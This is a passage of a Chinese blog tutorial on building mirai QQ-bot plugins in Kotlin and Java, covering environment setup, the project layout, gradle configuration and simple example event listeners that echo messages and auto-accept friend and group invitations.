href="https://github.com/mamoe/mirai/issues/959">issue#959</a>目前邀请机器人进200+人的群都不会触发事件</li><li>插件id必须为类包格式(xxx.xxx.xxx)</li><li>有的时候收不到机器人的信息是因为被tx风控了换号或多发几次以及多挂(可以去论坛看看)</li><li>建议看一遍官方文档虽然有点乱</li><li>如果遇到问题，可以去<a href="https://mirai.mamoe.net/">mirai论坛</a>上问</li><li>如果要在mcl内改登录协议，在login命令后加参数或在config&#x2F;console&#x2F;autologin.yml里面设置自动登录命令和登录的协议</li><li>mcl登录报错<code>环境异常</code>，参考<a href="https://mirai.mamoe.net/topic/223/%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E4%B8%B4%E6%97%B6%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88">论坛解决方案</a></li><li>改了入口点包路径需要到<code>resources\META-INF\services\net.mamoe.mirai.console.plugin.jvm.JvmPlugin</code>改成对应的类包路径</li></ul><h2 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h2><h3 id="i-配置java环境"><a href="#i-配置java环境" class="headerlink" title="i. 配置java环境"></a>i. 配置java环境</h3><p>下载mcl所需要的是&gt;&#x3D;11版本的openjdk，<a href="http://jdk.java.net/archive/">openjdk下载地址</a>，下载教程参考搜索引擎</p><blockquote><p>最好用openjdk而不是甲骨文(Oracle)的jdk，<a href="https://github.com/mamoe/mirai/discussions/779">原因</a></p></blockquote><h3 id="ii-配置IDE"><a href="#ii-配置IDE" class="headerlink" title="ii. 配置IDE"></a>ii. 配置IDE</h3><p>推荐IDEA吧，其他的也可以，主要是IDEA挺好用的<br>可以选择安装的官方插件:<br><a href="https://plugins.jetbrains.com/plugin/15094-mirai-console">Mirai Console IntelliJ 提供错误检查等功能</a><br><a href="https://plugins.jetbrains.com/plugin/14816-kotlin-jvm-blocking-bridge">Kotlin Jvm Blocking Bridge 帮助 Java 用户调用 Kotlin suspend 函数</a><br>详细参考<a href="https://github.com/mamoe/mirai-console/blob/master/docs/Preparations.md">官方文档</a></p><h3 id="iii-下载mirai-console-loader-mcl-作为启动器"><a href="#iii-下载mirai-console-loader-mcl-作为启动器" class="headerlink" title="iii. 下载mirai-console-loader(mcl)作为启动器"></a>iii. 下载mirai-console-loader(mcl)作为启动器</h3><p><a href="https://github.com/iTXTech/mirai-console-loader">官方地址</a><br>教程同见官方说明</p><h4 id="其他启动器"><a href="#其他启动器" class="headerlink" title="其他启动器"></a>其他启动器</h4><p>目前也出了其他启动器，查看<a href="https://github.com/mamoe/mirai-console/blob/master/docs/ConfiguringProjects.md#%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E">这里</a></p><h2 id="2-创建mirai-console插件项目"><a href="#2-创建mirai-console插件项目" class="headerlink" title="2.创建mirai-console插件项目"></a>2.创建mirai-console插件项目</h2><h3 id="i-下载"><a href="#i-下载" class="headerlink" title="i. 下载"></a>i. 下载</h3><ol><li>从<a href="https://github.com/project-mirai/mirai-hello-world">官方实例</a>或<a href="https://github.com/Nambers/mirai_plugin_example">笔者整理的mirai-console插件实例</a>中下载最新版的框架到本地，然后用IDE打开文件夹</li><li>使用插件生成，详细查看<a href="https://github.com/mamoe/mirai/blob/dev/docs/Preparations.md#%E5%AE%89%E8%A3%85-ide-%E6%8F%92%E4%BB%B6">官网</a></li></ol><h3 id="ii-个性化项目"><a href="#ii-个性化项目" class="headerlink" title="ii. 个性化项目"></a>ii. 个性化项目</h3><ul><li>在<code>settings.gradle.kts</code>里改生成的插件.jar名称也就是项目名称, 或者在build.gradle.kts里面获取shadowjar任务改如:<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tasks &#123;</span><br><span class="line">    afterEvaluate &#123;</span><br><span class="line">        named&lt;net.mamoe.mirai.console.gradle.BuildMiraiPluginTask&gt;(<span class="string">&quot;buildPlugin&quot;</span>) &#123;</span><br><span class="line">            archiveBaseName.<span class="keyword">set</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">            archiveClassifier.<span class="keyword">set</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            archiveVersion.<span class="keyword">set</span>(version)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>用<code>RunMiraikt</code>这个文件(在test文件夹下)可以在ide里运行，不用复制到mcl或其他启动器</li><li>用<code>buildPlugin</code>这个gradle任务可以生成.jar插件</li><li>在<code>src/main/kotlin/PluginMain</code>主类内可以修改插件信息(mcl用)</li><li>最好修改<code>PluginMain.kt</code>或<code>JavaPluginMain.java</code>的包名避免插件载入冲突,然后在<code>resources\META-INF\services\net.mamoe.mirai.console.plugin.jvm.JvmPlugin</code>中更改类包名到你改后的名，路径见下面</li></ul><h2 id="3-文件夹结构解析"><a href="#3-文件夹结构解析" class="headerlink" title="3. 文件夹结构解析"></a>3. 文件夹结构解析</h2><p>插件实例代码文件结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">│  build.gradle.kts gradle依赖列表</span><br><span class="line">│  settings.gradle.kts gradle设置</span><br><span class="line">│</span><br><span class="line">├─.run</span><br><span class="line">│      RunMiraiKt.run.xml IDE中运行任务配置，即RunMiraiKt源文件</span><br><span class="line">│</span><br><span class="line">├─run RunMiraiKt默认运行目录</span><br><span class="line">│</span><br><span class="line">└─src</span><br><span class="line">    ├─main</span><br><span class="line">    │  ├─kotlin</span><br><span class="line">    │  │      PluginMain.kt  kotlin插件主类</span><br><span class="line">    │  ├─Java</span><br><span class="line">    │  │      JavaPluginMain.java java插件主类</span><br><span class="line">│  │ </span><br><span class="line">│  ├─resources\META-INF\services</span><br><span class="line">│  │   net.mamoe.mirai.console.plugin.jvm.JvmPlugin Mirai加载的主类</span><br><span class="line">    └─test</span><br><span class="line">        └─kotlin</span><br><span class="line">                RunMirai.kt RunMiraiKt任务配置</span><br></pre></td></tr></table></figure><h2 id="4-kotlin插件代码解析"><a href="#4-kotlin插件代码解析" class="headerlink" title="4.kotlin插件代码解析"></a>4.kotlin插件代码解析</h2><p><strong>代码以github上的代码为准，可能会有更新</strong></p><h3 id="i-所有在以下代码中要引入的库"><a href="#i-所有在以下代码中要引入的库" class="headerlink" title="i.所有在以下代码中要引入的库"></a>i.所有在以下代码中要引入的库</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插件信息</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescription</span><br><span class="line"><span class="comment">//主类继承</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.KotlinPlugin</span><br><span class="line"><span class="comment">//机器人被拉进群的事件</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.BotInvitedJoinGroupRequestEvent</span><br><span class="line"><span class="comment">//收到好友信息事件</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent</span><br><span class="line"><span class="comment">//收到群消息事件</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent</span><br><span class="line"><span class="comment">//新好友申请事件</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.NewFriendRequestEvent</span><br><span class="line"><span class="comment">//日志组件(logger)发控制台信息函数</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.utils.info</span><br><span class="line"><span class="comment">//消息(messageChain)中的图片类型</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.Image</span><br><span class="line"><span class="comment">//消息(messageChain)中的纯文本类型</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.PlainText</span><br><span class="line"><span class="comment">//监听器</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.Listener</span><br><span class="line"><span class="comment">//监听范围</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.globalEventChannel</span><br><span class="line"><span class="comment">//协程范围?</span></span><br><span class="line"><span class="keyword">import</span> kotlin.coroutines.EmptyCoroutineContext</span><br></pre></td></tr></table></figure><p>监听和事件参考<a href="https://github.com/mamoe/mirai/blob/dev/docs/Events.md">官方文档</a></p><h3 id="ii-构建主类"><a href="#ii-构建主类" class="headerlink" title="ii.构建主类"></a>ii.构建主类</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> PluginMain : KotlinPlugin(</span><br><span class="line">    JvmPluginDescription(</span><br><span class="line">        id = <span class="string">&quot;org.example.mirai-example&quot;</span>,</span><br><span class="line">        version = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>kotlinPlugin</code>指继承plugin父类，<code>JvmPluginDescription</code>指声明插件消息和版本</p><h3 id="iii-覆盖插件启用函数"><a href="#iii-覆盖插件启用函数" class="headerlink" title="iii.覆盖插件启用函数"></a>iii.覆盖插件启用函数</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onEnable</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//或logger.info(&quot;xxx&quot;)作用一样</span></span><br><span class="line">logger.info &#123; <span class="string">&quot;Plugin loaded&quot;</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用kotlin关键字<code>override</code>实现插件启用函数，然后用<code>logger.info()</code>进行日志输出，其中<code>logger</code>是<code>kotlinPlugin</code>类内成员，除了<code>.info()</code>还有<code>.warning()</code>输出警告和<code>.error()</code>输出报错</p><h3 id="iv-监听事件"><a href="#iv-监听事件" class="headerlink" title="iv.监听事件"></a>iv.监听事件</h3><p>用<code> subscribeAlways&lt;&gt;&#123;&#125;</code>这个函数在<code>onEnable</code>函数中开启监听(还可以<code>subscribe</code>或<code>subscribeOnce</code>见mirai文档)</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">globalEventChannel().subscribeAlways&lt;GroupMessageEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//群消息</span></span><br><span class="line">          <span class="keyword">if</span> (message.contentToString().startsWith(<span class="string">&quot;复读&quot;</span>)) &#123;</span><br><span class="line">              group.sendMessage(message.contentToString().replace(<span class="string">&quot;复读&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (message.contentToString() == <span class="string">&quot;hi&quot;</span>) &#123;</span><br><span class="line">              group.sendMessage(<span class="string">&quot;hi&quot;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          message.forEach &#123;</span><br><span class="line">              <span class="comment">//循环每个元素在消息里</span></span><br><span class="line">              <span class="keyword">if</span> (it <span class="keyword">is</span> Image) &#123;</span><br><span class="line">                  <span class="comment">//如果消息这一部分是图片</span></span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (it <span class="keyword">is</span> PlainText) &#123;</span><br><span class="line">                  <span class="comment">//如果消息这一部分是纯文本</span></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      globalEventChannel().subscribeAlways&lt;FriendMessageEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//好友信息</span></span><br><span class="line">      &#125;</span><br><span class="line">      globalEventChannel().subscribeAlways&lt;NewFriendRequestEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//自动同意好友申请</span></span><br><span class="line">          accept()</span><br><span class="line">      &#125;</span><br><span class="line">      globalEventChannel().subscribeAlways&lt;BotInvitedJoinGroupRequestEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//自动同意加群申请</span></span><br><span class="line">          accept()</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="v-全部代码"><a href="#v-全部代码" class="headerlink" title="v. 全部代码"></a>v. 全部代码</h3><p>这些代码是<a href="https://github.com/Nambers/mirai_kotlin_example">笔者整理的mirai-console插件kotlin版实例</a>中的内容</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.mirai.plugin</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescription</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.KotlinPlugin</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.Listener</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.BotInvitedJoinGroupRequestEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.NewFriendRequestEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.globalEventChannel</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.code.MiraiCode</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.utils.info</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.Image</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.Image.Key.queryUrl</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.PlainText</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用kotlin版请把</span></span><br><span class="line"><span class="comment">src/main/resources/META-INF.services/net.mamoe.mirai.console.plugin.jvm.JvmPlugin</span></span><br><span class="line"><span class="comment">文件内容改成&quot;org.example.mirai.plugin.PluginMain&quot;也就是当前主类</span></span><br><span class="line"><span class="comment">使用kt可以把java文件夹删除不会对项目有影响</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在settings.gradle.kts里改生成的插件.jar名称</span></span><br><span class="line"><span class="comment">build.gradle.kts里改依赖库和插件版本</span></span><br><span class="line"><span class="comment">在主类下的JvmPluginDescription改插件名称，id和版本</span></span><br><span class="line"><span class="comment">用runmiraikt这个配置可以在ide里运行，不用复制到mcl或其他启动器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span> PluginMain : KotlinPlugin(</span><br><span class="line">    JvmPluginDescription(</span><br><span class="line">        id = <span class="string">&quot;org.example.mirai-example&quot;</span>,</span><br><span class="line">        name = <span class="string">&quot;插件示例&quot;</span>,</span><br><span class="line">        version = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onEnable</span><span class="params">()</span></span> &#123;</span><br><span class="line">        logger.info &#123; <span class="string">&quot;Plugin loaded&quot;</span> &#125;</span><br><span class="line">        <span class="comment">//配置文件目录 &quot;$&#123;dataFolder.absolutePath&#125;/&quot;</span></span><br><span class="line"></span><br><span class="line">        globalEventChannel().subscribeAlways&lt;GroupMessageEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//群消息</span></span><br><span class="line">            group.sendMessage(<span class="string">&quot;\uD83D\uDE03&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        globalEventChannel().subscribeAlways&lt;FriendMessageEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//好友信息</span></span><br><span class="line">            sender.sendMessage(<span class="string">&quot;hi&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        globalEventChannel().subscribeAlways&lt;NewFriendRequestEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//自动同意好友申请</span></span><br><span class="line">            accept()</span><br><span class="line">        &#125;</span><br><span class="line">        globalEventChannel().subscribeAlways&lt;BotInvitedJoinGroupRequestEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//自动同意加群申请</span></span><br><span class="line">            accept()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="vi-gradle部分代码"><a href="#vi-gradle部分代码" class="headerlink" title="vi. gradle部分代码"></a>vi. gradle部分代码</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    val kotlinVersion = <span class="string">&quot;1.4.30&quot;</span></span><br><span class="line">    kotlin(<span class="string">&quot;jvm&quot;</span>) version kotlinVersion</span><br><span class="line">    kotlin(<span class="string">&quot;plugin.serialization&quot;</span>) version kotlinVersion</span><br><span class="line">    id(<span class="string">&quot;net.mamoe.mirai-console&quot;</span>) version <span class="string">&quot;2.3.2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">group = <span class="string">&quot;org.example&quot;</span></span><br><span class="line">version = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"></span><br><span class="line">repositories &#123;</span><br><span class="line">    jcenter()</span><br><span class="line">    <span class="comment">//国内镜像源</span></span><br><span class="line">    <span class="comment">//华为云</span></span><br><span class="line">    maven &#123; url =uri(<span class="string">&quot;https://mirrors.huaweicloud.com/repository/maven&quot;</span>) &#125;</span><br><span class="line">    <span class="comment">//阿里云</span></span><br><span class="line">    maven &#123; url =uri(<span class="string">&quot;https://maven.aliyun.com/nexus/content/repositories/jcenter&quot;</span>)&#125;</span><br><span class="line">    <span class="comment">//mirai-console的仓库</span></span><br><span class="line">    maven &#123;url = uri(<span class="string">&quot;https://dl.bintray.com/him188moe/mirai&quot;</span>)&#125;</span><br><span class="line">    <span class="comment">//滑动模块的仓库</span></span><br><span class="line">    <span class="comment">// maven &#123; url = uri(&quot;https://dl.bintray.com/karlatemp/misc&quot;) &#125;</span></span><br><span class="line">    mavenLocal()</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line">dependencies&#123;</span><br><span class="line">    <span class="comment">//在IDE内运行的mcl添加滑块模块，请参考https://github.com/project-mirai/mirai-login-solver-selenium把版本更新为最新</span></span><br><span class="line">    <span class="comment">//runtimeOnly(&quot;net.mamoe:mirai-login-solver-selenium:1.0-dev-15&quot;)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>2.3.2</code>是目前最新开发版本，请自行通过<a href="https://github.com/mamoe/mirai-console/blob/master/docs/ConfiguringProjects.md#%E9%80%89%E6%8B%A9%E7%89%88%E6%9C%AC">官方文档</a>选择版本并更改<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-0.png" alt="更改版本"></p><h2 id="5-Java插件代码解析"><a href="#5-Java插件代码解析" class="headerlink" title="5. Java插件代码解析"></a>5. Java插件代码解析</h2><h3 id="i-在下面代码中要引入的库"><a href="#i-在下面代码中要引入的库" class="headerlink" title="i. 在下面代码中要引入的库"></a>i. 在下面代码中要引入的库</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JavaPlugin;</span><br><span class="line"><span class="comment">//继承对象</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescriptionBuilder;</span><br><span class="line"><span class="comment">//构造插件信息</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.GlobalEventChannel;</span><br><span class="line"><span class="comment">//全局监听通道</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent;</span><br><span class="line"><span class="comment">//好友信息事件</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent;</span><br><span class="line"><span class="comment">//群消息事件</span></span><br></pre></td></tr></table></figure><h3 id="ii-构建主类-1"><a href="#ii-构建主类-1" class="headerlink" title="ii. 构建主类"></a>ii. 构建主类</h3><p>构建mirai插件的主类也就是入口点，必须要继承JavaPlugin</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JavaPluginMain</span> <span class="keyword">extends</span> <span class="title class_">JavaPlugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JavaPluginMain</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaPluginMain</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">JavaPluginMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">JvmPluginDescriptionBuilder</span>(<span class="string">&quot;org.example.mirai-example&quot;</span>, <span class="string">&quot;0.1.0&quot;</span>)</span><br><span class="line">                .info(<span class="string">&quot;EG&quot;</span>)</span><br><span class="line">                .build());</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中<code>JvmPluginDescriptionBuilder</code>的声明插件信息</p><h3 id="iii-覆盖插件启用函数-1"><a href="#iii-覆盖插件启用函数-1" class="headerlink" title="iii. 覆盖插件启用函数"></a>iii. 覆盖插件启用函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEnable</span><span class="params">()</span> &#123;</span><br><span class="line">        getLogger().info(<span class="string">&quot;日志&quot;</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>用<code>getLogger()</code>获取日志对象，然后用<code>.info()</code>发送普通日志</p><h3 id="iv-监听事件-1"><a href="#iv-监听事件-1" class="headerlink" title="iv. 监听事件"></a>iv. 监听事件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GlobalEventChannel.INSTANCE.subscribeAlways(GroupMessageEvent.class, g -&gt; &#123;</span><br><span class="line">            <span class="comment">//监听群消息</span></span><br><span class="line">            getLogger().info(g.getMessage().contentToString());</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        GlobalEventChannel.INSTANCE.subscribeAlways(FriendMessageEvent.class, f -&gt; &#123;</span><br><span class="line">            <span class="comment">//监听好友消息</span></span><br><span class="line">            getLogger().info(f.getMessage().contentToString());</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><h3 id="v-全部代码-1"><a href="#v-全部代码-1" class="headerlink" title="v. 全部代码"></a>v. 全部代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.mirai.plugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JavaPlugin;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescriptionBuilder;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.GlobalEventChannel;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JavaPluginMain</span> <span class="keyword">extends</span> <span class="title class_">JavaPlugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JavaPluginMain</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaPluginMain</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">JavaPluginMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">JvmPluginDescriptionBuilder</span>(<span class="string">&quot;org.example.mirai-example&quot;</span>, <span class="string">&quot;0.1.0&quot;</span>)</span><br><span class="line">                .info(<span 